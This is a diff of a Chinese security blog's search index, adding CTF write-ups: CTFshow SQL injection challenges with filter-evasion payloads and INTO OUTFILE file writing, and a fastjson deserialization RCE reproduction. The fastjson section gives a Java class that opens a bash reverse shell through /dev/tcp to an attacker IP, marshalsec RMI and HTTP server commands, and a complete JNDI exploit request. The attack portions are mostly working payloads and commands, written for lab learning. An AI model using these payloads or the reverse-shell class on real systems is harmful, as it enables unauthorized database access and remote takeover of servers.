+<p>仿照web174构造</p>
+<p><code>1&#39; union select username,password from ctfshow_user5 where username=&quot;flag&quot; into outfile &#39;/var/www/html/ctfshow.txt&#39; --+ </code></p>
+<p>在网站根目录下写入文件<code>ctfshow.txt</code></p>
+<blockquote>
+<p>Apache默认根目录是:/var/www/html</p>
+</blockquote>
+<p><img src="https://i.loli.net/2021/07/11/7cWRP95YaJb8AwS.png" alt="image-20210709100434410"></p>
+<h4 id="二分法盲注"><a href="#二分法盲注" class="headerlink" title="二分法盲注"></a>二分法盲注</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>对于无过滤的sql注入，可以通过<code>十六进制</code>或<code>base64</code>编码替换进行绕过，还可以跑盲注脚本，利用二分法或sleep()函数；还可以尝试是否有权限写入网站根目录文件，然后直接访问该文件</p>
+<h3 id="参考博客"><a href="#参考博客" class="headerlink" title="参考博客"></a>参考博客</h3><p><a href="https://blog.csdn.net/solitudi/article/details/110144623">[CTFSHOW]SQL注入(WEB入门)</a></p>
+<p><a href="https://yq1ng.github.io/z_post/CTFSHOW-WEB%E5%85%A5%E9%97%A8-Ttick%E6%80%BB%E7%BB%93/#more">CTFSHOW WEB入门 Ttick总结</a></p>
+<p><a href="https://blog.csdn.net/rfrder/article/details/113664639">CTFshow-WEB入门-SQL注入(上)</a></p>
+<h2 id="day5-web入门之sql注入-过滤注入"><a href="#day5-web入门之sql注入-过滤注入" class="headerlink" title="day5 web入门之sql注入-过滤注入"></a>day5 web入门之sql注入-过滤注入</h2><h3 id="web176-select被过滤"><a href="#web176-select被过滤" class="headerlink" title="web176-select被过滤"></a>web176-select被过滤</h3><p><img src="https://i.loli.net/2021/07/11/7cWRP95YaJb8AwS.png" alt="image-20210709105105072"></p>
+<p><code>1&#39; Union select 1,2,3--+</code>无回显</p>
+<p><code>1&#39; union Select 1,2,3--+</code>有回显</p>
+<p>经过测试是只对<code>select</code>进行了过滤，通过大小写绕过</p>
+<h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><p><code>1&#39; union Select 1,group_concat(username),group_concat(password) from ctfshow_user where username=&quot;flag&quot;--+</code></p>
+<h3 id="web177-空格和-被过滤"><a href="#web177-空格和-被过滤" class="headerlink" title="web177-空格和#被过滤"></a>web177-空格和#被过滤</h3><p><code>1&#39;--+</code>无回显，<code>1&#39;--</code>无回显，<code>--</code>被过滤</p>
+<p><code>1&#39;#</code>无回显，<code>#</code>也被过滤，使用url编码<code>%23</code>绕过，<code>1&#39;%23</code>有回显</p>
+<p>而在判断字段时又没有回显，好家伙原来吧空格也过滤了，使用<code>/**/</code>绕过，字段数还是3</p>
+<blockquote>
+<p>空格绕过的方式：</p>
+<ol>
+<li>注释符<code>/**/</code>，tab键<code>%a0</code></li>
+<li>括号绕过，常用于时间盲注</li>
+</ol>
+</blockquote>
+<h4 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h4><p><code>1&#39;/**/union/**/select/**/1,group_concat(username),group_concat(password)/**/from/**/ctfshow_user/**/where/**/username=&quot;flag&quot;/**/%23</code></p>
+<h3 id="web178"><a href="#web178" class="headerlink" title="web178"></a>web178</h3><p><code>/**/</code>和<code>%a0</code>被过滤，使用括号或是<code>%0a,%09,%0b,%0c,%0d</code>都行</p>
+<h4 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h4><p><code>1&#39;union(select(1),(username),(password)from(ctfshow_user)where(username=&quot;flag&quot;))%23</code></p>
+<p><img src="https://i.loli.net/2021/07/11/7cWRP95YaJb8AwS.png" alt="image-20210709170348722"></p>
+<h3 id="web179"><a href="#web179" class="headerlink" title="web179"></a>web179</h3><p>只剩下<code>%0c</code>可以用了，其他都被过滤了</p>
+<p><img src="https://i.loli.net/2021/07/09/iQ5YydxOWqcsouf.png" alt="image-20210709172329770"></p>
+<h4 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h4><p><code>1&#39;union%0cselect%0c1,username,password%0cfrom%0cctfshow_user%0cwhere%0cusername=&quot;flag&quot;%0c%0c%23</code></p>
+<p><img src="https://i.loli.net/2021/07/09/AGwtTmJbDRxkiPN.png" alt="image-20210709173023533"></p>
+<p>晴天师傅的通杀payload</p>
+<p><code>?id=&#39;or(1)%23</code></p>
+<h3 id="web180"><a href="#web180" class="headerlink" title="web180"></a>web180</h3><p>是对<code>%23</code>进行了过滤，不能注释后面的’了，只能通过构造<code>&#39;1&#39;=&#39;1</code></p>
+<p>贴上Y4tacker师傅的</p>
+<h4 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h4><p><code>-1&#39;or(id=26)and&#39;1&#39;=&#39;1</code></p>
+<p>-1就是用来注释的，这个payload也相当于<code>&#39;or(id=26)and&#39;1&#39;=&#39;1</code></p>
+<p>放进这个拼接的语句中就是<code>where username !=&#39;flag&#39; and id=&#39;&#39;or(id=26)and&#39;1&#39;=&#39;1&#39; limit 1;&quot;</code></p>
+<p><img src="https://i.loli.net/2021/07/09/N2JdzpWZDRIHT16.png" alt="image-20210709200537410"></p>
+<p>又因为and的优先级比or高，那就又相当于</p>
+<p><code>(username !=&#39;flag&#39; and id = &#39;&#39;)  or  (id=26 and&#39;1&#39;=&#39;1&#39;)</code></p>
+<p>or右边的值为1，可以读出id=26的数据</p>
+<p>还可以盲注</p>
+<p><img src="https://i.loli.net/2021/07/09/vQoe79qtV3Pjg2z.png" alt="image-20210709201034411"></p>
+<h3 id="web181"><a href="#web181" class="headerlink" title="web181"></a>web181</h3><p>除了括号其他能代替的都被过滤了，继续使用y4师傅的payload</p>
+<p><img src="https://i.loli.net/2021/07/09/SvKtyFL3j4oGA7g.png" alt="image-20210709210302177"></p>
+<h3 id="web182"><a href="#web182" class="headerlink" title="web182"></a>web182</h3><p>这次又把<code>flag</code>给过滤了，继续用师傅的payload</p>
+<p><img src="https://i.loli.net/2021/07/09/MxH1Q9EOYT7FNyG.png" alt="image-20210709212746118"></p>
+<h3 id="web183"><a href="#web183" class="headerlink" title="web183"></a>web183</h3><p>我是fw</p>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.cnblogs.com/Vinson404/p/7253255.html">sql注入绕过技巧</a></p>
+<h2 id="参考博客-1"><a href="#参考博客-1" class="headerlink" title="参考博客"></a>参考博客</h2><p><a href="https://blog.csdn.net/solitudi/article/details/110144623">[CTFSHOW]SQL注入(WEB入门)</a></p>
+<p><a href="https://yq1ng.github.io/z_post/CTFSHOW-WEB%E5%85%A5%E9%97%A8-Ttick%E6%80%BB%E7%BB%93/#more">CTFSHOW WEB入门 Ttick总结</a></p>
+<p><a href="https://blog.csdn.net/rfrder/article/details/113664639">CTFshow-WEB入门-SQL注入(上)</a></p>
+]]></content>
+      <categories>
+        <category>ctf-sql</category>
+      </categories>
+      <tags>
+        <tag>ctf-sql</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>ctfhub之ssrf</title>
     <url>/2021/07/19/ctfhub%E4%B9%8Bssrf/</url>
     <content><![CDATA[<h1 id="ctfshow之ssrf"><a href="#ctfshow之ssrf" class="headerlink" title="ctfshow之ssrf"></a>ctfshow之ssrf</h1><h2 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h2><h2 id="内网访问（http协议）"><a href="#内网访问（http协议）" class="headerlink" title="内网访问（http协议）"></a>内网访问（http协议）</h2><p>尝试访问位于127.0.0.1的flag.php吧</p>
@@ -314,6 +314,11 @@
       <tags>
         <tag>ctf</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>dnslog盲打</title>
+    <url>/2021/09/18/dnslog%E7%9B%B2%E6%89%93/</url>
+    <content><![CDATA[]]></content>
   </entry>
   <entry>
     <title>docker基本使用</title>
@@ -376,11 +381,6 @@
       <tags>
         <tag>docker</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>dnslog盲打</title>
-    <url>/2021/09/18/dnslog%E7%9B%B2%E6%89%93/</url>
-    <content><![CDATA[]]></content>
   </entry>
   <entry>
     <title>fastjson-1.2.24-rce</title>
@@ -486,6 +486,40 @@
 </blockquote>
 <p>访问8090端口</p>
 <p><img src="https://i.loli.net/2021/09/22/Z1IapGmlACtJzw2.png" alt="image-20210922200207047"></p>
+<h4 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h4><p>同fastjson1.2.24复现步骤</p>
+<ul>
+<li>编译生成恶意类.class</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class Exploit &#123;</span><br><span class="line">    public Exploit()&#123;</span><br><span class="line">        try&#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;&#x2F;bin&#x2F;bash -c $@|bash 0 echo bash -i &gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;接收shell的ip&#x2F;8888 0&gt;&amp;1&quot;);</span><br><span class="line">        &#125;catch(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public static void main(String[] argv)&#123;</span><br><span class="line">        Exploit e &#x3D; new Exploit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<ul>
+<li>python开启一个临时web服务<code>SimpleHTTPServer</code></li>
+</ul>
+<p><code>python -m  SimpleHTTPServer 4444</code></p>
+<blockquote>
+<p><strong>为了接收LDAP服务重定向请求</strong>，并需要在payload目录下开启，这样才能访问到payload文件</p>
+</blockquote>
+<ul>
+<li>marshalsec开启LDAP或是RMI监听</li>
+</ul>
+<p><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.j marshalsec.jndi.RMIRefServer &quot;http://攻击者ip:4444/#Exploit&quot; 9999</code></p>
+<blockquote>
+<p>借助LDAP服务将LDAP reference result 重定向到web服务器</p>
+<p>LDAP动态类加载，如果当前JVM中没有某个类的定义，它可以从远程URL去下载这个类的class，动态加载的对象class文件可以使用Web服务的方式进行托管</p>
+</blockquote>
+<ul>
+<li>burp发送poc</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 靶机ip</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 6.2; WOW64; rv:18.0) Gecko&#x2F;20100101 Firefox&#x2F;18.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-cn,zh;q&#x3D;0.8,en-us;q&#x3D;0.5,en;q&#x3D;0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 264</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;攻击者ip:9999&#x2F;Exploit&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p><img src="https://i.loli.net/2021/09/23/YgxWpiS7dbhQnoH.png" alt="image-20210923113053182"></p>
+<p>注：所有的工具和编译文件要放在同一目录下，并且python开启http服务也在当前目录</p>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.cnblogs.com/null1433/p/12697682.html">https://www.cnblogs.com/null1433/p/12697682.html</a></p>
+<p><a href="https://blog.csdn.net/qq_40989258/article/details/103049474">https://blog.csdn.net/qq_40989258/article/details/103049474</a></p>
+<p><a href="https://www.cnblogs.com/hei-zi/p/13274272.html">https://www.cnblogs.com/hei-zi/p/13274272.html</a></p>
+<p><a href="https://www.cnblogs.com/Welk1n/p/11446519.html">fastjson漏洞分析利用</a></p>
 ]]></content>
   </entry>
   <entry>
